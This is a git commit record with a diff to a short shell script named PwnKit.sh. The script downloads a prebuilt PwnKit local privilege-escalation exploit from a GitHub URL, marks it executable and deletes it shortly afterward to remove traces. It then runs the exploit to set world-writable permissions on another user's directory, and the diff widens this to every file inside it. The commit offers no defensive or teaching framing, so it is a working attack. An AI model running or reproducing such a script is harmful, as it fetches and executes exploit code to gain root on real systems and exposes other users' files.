d0c37d30e704b64a44403447511767f282edeac6
ZeroHitman <carmeril47@gmail.com>
2025-11-04 11:15:17 +0700

    Update PwnKit.sh

--- pwnkit/PwnKit.sh
+++ pwnkit/PwnKit.sh
@@ -1,4 +1,4 @@
 curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit || exit
 chmod +x ./PwnKit || exit
 (sleep 1 && rm ./PwnKit & )
-./PwnKit chmod 777 /home/ivan/Covid19IA/
+./PwnKit chmod 777 /home/ivan/Covid19IA/*
